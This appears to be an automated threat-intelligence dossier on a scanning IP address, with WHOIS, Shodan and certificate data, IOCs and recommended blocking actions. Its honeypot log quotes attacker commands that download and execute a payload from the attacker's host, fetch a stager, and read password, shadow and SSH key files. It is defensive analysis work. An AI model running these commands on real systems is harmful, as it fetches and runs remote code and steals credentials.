# Intelligence Dossier: 198.51.100.23

**Generated:** 2024-06-15T03:18:42Z
**Trigger:** ET SCAN Nmap Scripting Engine User-Agent Detected (Nmap Scripting Engine)
**Agent:** The Mirror (cyber-riposte)

---

## Summary

Attacker `198.51.100.23` was detected performing an Nmap service scan against our perimeter at 03:14Z. Traffic was redirected to a honeypot within 8 seconds. Passive OSINT was collected while the attacker continued probing the honeypot for 23 minutes before disconnecting.

---

## WHOIS

- **Owner:** Example Hosting LLC
- **ASN:** AS64496
- **Net range:** 198.51.100.0/24
- **Country:** NL (Netherlands)
- **Abuse contact:** abuse@example-hosting.nl
- **Registration date:** 2023-08-12

## Reverse DNS

- **PTR record:** vps-7429.example-hosting.nl
- **Hosting provider:** Example Hosting (budget VPS provider, Netherlands)

## Shodan — Attacker's Infrastructure

- **Open ports:** 22, 80, 443, 4444, 8080, 8443
- **Operating system:** Linux 5.15
- **Service banners:**

  - Port 22: `OpenSSH 8.9p1 Ubuntu-3ubuntu0.6`
  - Port 80: `Apache/2.4.52 (Ubuntu)` — default page
  - Port 443: `nginx/1.24.0` — self-signed certificate
  - Port 4444: `Metasploit RPC` (!)
  - Port 8080: `Cobalt Strike Beacon` (!)
  - Port 8443: `Covenant C2` (!)

- **Known vulnerabilities:** CVE-2023-XXXXX (OpenSSH pre-auth)

> **Note:** Ports 4444, 8080, and 8443 are running offensive security tools (Metasploit, Cobalt Strike, Covenant). This is almost certainly an attack-dedicated VPS.

## Certificate Transparency

Domains with TLS certificates issued to hostnames on this IP:

- `phishing-login.example.com` (issued 2024-06-10)
- `update-service.example.net` (issued 2024-06-12)
- `vpn-portal.example.org` (issued 2024-06-14)

> **Note:** These domains were registered within the last week and follow a pattern consistent with phishing infrastructure staging.

## Honeypot Interaction Summary

- **Session duration:** 23 minutes
- **Commands entered:** 47
- **Credentials attempted:** 12 username/password combinations
- **Files downloaded:** 1 (`wget http://198.51.100.23:8080/payload.elf`)
- **Tools identified:** Nmap 7.94, Hydra 9.5, custom Python script

### Selected Commands (from Cowrie log)

```
$ uname -a
$ cat /etc/passwd
$ wget http://198.51.100.23:8080/payload.elf
$ chmod +x payload.elf
$ ./payload.elf
$ curl http://198.51.100.23:4444/stager
$ cat /etc/shadow
$ find / -name "*.pem" 2>/dev/null
$ cat /root/.ssh/authorized_keys
```

## IOCs for Threat Intel Platforms

```json
{
  "ip": "198.51.100.23",
  "asn": "AS64496",
  "domains": [
    "phishing-login.example.com",
    "update-service.example.net",
    "vpn-portal.example.org"
  ],
  "open_ports": [22, 80, 443, 4444, 8080, 8443],
  "tools_detected": ["metasploit", "cobalt-strike", "covenant"],
  "payload_hash": "sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
  "payload_url": "http://198.51.100.23:8080/payload.elf"
}
```

## Recommended Actions

1. Permanent block rule for `198.51.100.23` (included in this PR)
2. Block associated domains: `phishing-login.example.com`, `update-service.example.net`, `vpn-portal.example.org`
3. Report to abuse contact: `abuse@example-hosting.nl`
4. Ingest IOCs into threat intel platform
5. Investigate `payload.elf` in sandbox (hash above)
6. Check if phishing domains have been used against employees
